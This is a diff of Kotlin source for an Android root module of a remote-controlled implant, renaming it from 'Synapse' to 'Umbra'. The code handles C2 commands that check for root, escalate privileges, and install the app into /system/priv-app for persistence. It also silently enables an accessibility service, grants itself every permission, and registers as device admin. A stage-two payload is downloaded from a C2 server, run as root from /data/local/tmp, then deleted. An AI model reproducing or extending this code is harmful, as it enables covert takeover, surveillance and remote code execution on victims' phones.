@@ -1,12 +1,12 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.Context
 import android.os.Build
 import android.os.Process
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
-import org.synapse.core.c2.Command
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.UmbraResponse
 import java.io.BufferedReader
 import java.io.File
 import java.io.InputStreamReader
@@ -57,7 +57,7 @@ object RootModule {
     // ═══════════════════════════════════════════════════════════════════
     //  COMMAND 1: root/check
     // ═══════════════════════════════════════════════════════════════════
-    suspend fun check(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun check(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val status = mutableMapOf<String, Any>()
 
         // Check current UID
@@ -156,7 +156,7 @@ object RootModule {
             File("/proc/sys/kernel/unprivileged_bpf_disabled").readText().trim()
         } catch (_: Exception) { "unknown" }
 
-        SynapseResponse.RootCheckResponse(
+        UmbraResponse.RootCheckResponse(
             status = "check_complete",
             details = status.mapValues { it.value.toString() }
         )
@@ -165,7 +165,7 @@ object RootModule {
     // ═══════════════════════════════════════════════════════════════════
     //  COMMAND 2: root/exploit
     // ═══════════════════════════════════════════════════════════════════
-    suspend fun exploit(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun exploit(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val results = mutableMapOf<String, String>()
         var achieved = false
 
@@ -199,7 +199,7 @@ object RootModule {
         results["final_uid"] = uid.toString()
         results["root_achieved"] = achieved.toString()
 
-        SynapseResponse.RootActionResponse(
+        UmbraResponse.RootActionResponse(
             action = "exploit",
             success = achieved,
             results = results
@@ -209,11 +209,11 @@ object RootModule {
     // ═══════════════════════════════════════════════════════════════════
     //  COMMAND 3: root/daemonize
     // ═══════════════════════════════════════════════════════════════════
-    suspend fun daemonize(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun daemonize(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val results = mutableMapOf<String, String>()
 
         if (Process.myUid() != 0) {
-            return@withContext SynapseResponse.ErrorResponse(
+            return@withContext UmbraResponse.ErrorResponse(
                 error = "Not root (uid=${Process.myUid()}), cannot daemonize",
                 module = "root"
             )
@@ -225,8 +225,8 @@ object RootModule {
 
         // Step 2: Copy APK to /system/priv-app/ for permanent persistence
         val apkPath = context.packageCodePath
-        val targetDir = "/system/priv-app/SynapseCore"
-        val targetApk = "$targetDir/SynapseCore.apk"
+        val targetDir = "/system/priv-app/UmbraCore"
+        val targetApk = "$targetDir/UmbraCore.apk"
         val copyResult = execCmd(arrayOf("su", "-c", "mkdir -p $targetDir && cp $apkPath $targetApk && chmod 644 $targetApk && chown root:root $targetDir && chmod 755 $targetDir"))
         results["copy_to_priv_app"] = copyResult
 
@@ -235,7 +235,7 @@ object RootModule {
         results["selinux_context"] = seContext
 
         // Also fix the data directory
-        val dataDirContext = execCmd(arrayOf("su", "-c", "chcon -R u:object_r:system_app_data_file:s0 /data/data/org.synapse.core"))
+        val dataDirContext = execCmd(arrayOf("su", "-c", "chcon -R u:object_r:system_app_data_file:s0 /data/data/org.umbra.core"))
         results["selinux_data_context"] = dataDirContext
 
         // Step 4: Grant ALL permissions via pm grant (works as root)
@@ -278,10 +278,10 @@ object RootModule {
         results["permission_grants"] = grantResults.joinToString("\n")
 
         // Step 5: Start all monitors
-        results["live_start"] = execCmd(arrayOf("su", "-c", "am broadcast -a org.synapse.core.START_ALL_MONITORS -n org.synapse.core/.persistence.SynapseService"))
+        results["live_start"] = execCmd(arrayOf("su", "-c", "am broadcast -a org.umbra.core.START_ALL_MONITORS -n org.umbra.core/.persistence.UmbraService"))
 
         // Step 6: Enable AccessibilityService programmatically
-        val enableA11ySettings = "settings put secure enabled_accessibility_services $pkg/${pkg}.modules.SynapseAccessibilityService"
+        val enableA11ySettings = "settings put secure enabled_accessibility_services $pkg/${pkg}.modules.UmbraAccessibilityService"
         val enableA11y = execCmd(arrayOf("su", "-c", enableA11ySettings))
         results["accessibility_enabled"] = enableA11y
 
@@ -293,13 +293,13 @@ object RootModule {
         results["battery_optimization"] = disableBattery
 
         // Step 8: Make app device admin if possible
-        results["device_admin"] = execCmd(arrayOf("su", "-c", "dpm set-active-admin --user current $pkg/.persistence.SynapseService"))
+        results["device_admin"] = execCmd(arrayOf("su", "-c", "dpm set-active-admin --user current $pkg/.persistence.UmbraService"))
 
         // Final verification
         val fileCheck = execCmd(arrayOf("su", "-c", "ls -la $targetApk"))
-        results["verification"] = if (fileCheck.contains("SynapseCore.apk")) "persistence confirmed" else "persistence may have failed: $fileCheck"
+        results["verification"] = if (fileCheck.contains("UmbraCore.apk")) "persistence confirmed" else "persistence may have failed: $fileCheck"
 
-        SynapseResponse.RootActionResponse(
+        UmbraResponse.RootActionResponse(
             action = "daemonize",
             success = true,
             results = results
@@ -309,11 +309,11 @@ object RootModule {
     // ═══════════════════════════════════════════════════════════════════
     //  COMMAND 4: root/exploit_download
     // ═══════════════════════════════════════════════════════════════════
-    suspend fun exploitDownload(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun exploitDownload(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val results = mutableMapOf<String, String>()
 
         // Get C2 base URL from prefs
-        val prefs = context.getSharedPreferences("synapse_prefs", Context.MODE_PRIVATE)
+        val prefs = context.getSharedPreferences("umbra_prefs", Context.MODE_PRIVATE)
         val c2Url = prefs.getString("c2_base_url", "wss://192.168.1.9:8443/c2") ?: "wss://192.168.1.9:8443/c2"
 
         // Convert wss:// to https://
@@ -339,13 +339,13 @@ object RootModule {
             connection.requestMethod = "GET"
             connection.connectTimeout = 30000
             connection.readTimeout = 60000
-            connection.setRequestProperty("User-Agent", "Synapse-Stage2/1.0")
+            connection.setRequestProperty("User-Agent", "Umbra-Stage2/1.0")
 
             val responseCode = connection.responseCode
             results["http_status"] = responseCode.toString()
 
             if (responseCode != 200) {
-                return@withContext SynapseResponse.RootActionResponse(
+                return@withContext UmbraResponse.RootActionResponse(
                     action = "exploit_download",
                     success = false,
                     results = results + ("error" to "HTTP $responseCode")
@@ -365,7 +365,7 @@ object RootModule {
                 results["sha256_expected"] = expectedSha
                 results["sha256_actual"] = actualSha
                 if (!actualSha.equals(expectedSha, ignoreCase = true)) {
-                    return@withContext SynapseResponse.RootActionResponse(
+                    return@withContext UmbraResponse.RootActionResponse(
                         action = "exploit_download",
                         success = false,
                         results = results + ("error" to "SHA256 mismatch")
@@ -375,20 +375,20 @@ object RootModule {
             }
 
             // Write to /data/local/tmp/
-            val exploitFile = File("/data/local/tmp/synapse_stage2")
+            val exploitFile = File("/data/local/tmp/umbra_stage2")
             exploitFile.writeBytes(payload)
 
             // Make executable
-            val chmodResult = execCmd(arrayOf("chmod", "755", "/data/local/tmp/synapse_stage2"))
+            val chmodResult = execCmd(arrayOf("chmod", "755", "/data/local/tmp/umbra_stage2"))
             results["chmod"] = chmodResult
 
             // Execute with su if available
             val useSu = cmd.params["use_su"]?.toBoolean() ?: true
             val execResult: String
             if (useSu) {
-                execResult = execCmd(arrayOf("su", "-c", "/data/local/tmp/synapse_stage2"))
+                execResult = execCmd(arrayOf("su", "-c", "/data/local/tmp/umbra_stage2"))
             } else {
-                execResult = execCmd(arrayOf("/data/local/tmp/synapse_stage2"))
+                execResult = execCmd(arrayOf("/data/local/tmp/umbra_stage2"))
             }
             results["exec_stdout"] = execResult
 
@@ -400,14 +400,14 @@ object RootModule {
             // Clean up
             exploitFile.delete()
 
-            SynapseResponse.RootActionResponse(
+            UmbraResponse.RootActionResponse(
                 action = "exploit_download",
                 success = true,
                 results = results
             )
 
         } catch (e: Exception) {
-            SynapseResponse.RootActionResponse(
+            UmbraResponse.RootActionResponse(
                 action = "exploit_download",
                 success = false,
                 results = results + ("error" to e.message.orEmpty())
@@ -479,11 +479,11 @@ object RootModule {
 
     private fun tryLocalTmp(context: Context): String {
         return try {
-            val tmpFile = File("/data/local/tmp/synapse_test_$$")
+            val tmpFile = File("/data/local/tmp/umbra_test_$$")
             tmpFile.writeText("#!/system/bin/sh\necho 'SYNAPSE_WRITE_OK'")
             tmpFile.setExecutable(true)
 
-            val p = Runtime.getRuntime().exec(arrayOf("/data/local/tmp/synapse_test_$$"))
+            val p = Runtime.getRuntime().exec(arrayOf("/data/local/tmp/umbra_test_$$"))
             p.waitFor()
             val stdout = p.inputStream.bufferedReader().readText().trim()
             tmpFile.delete()
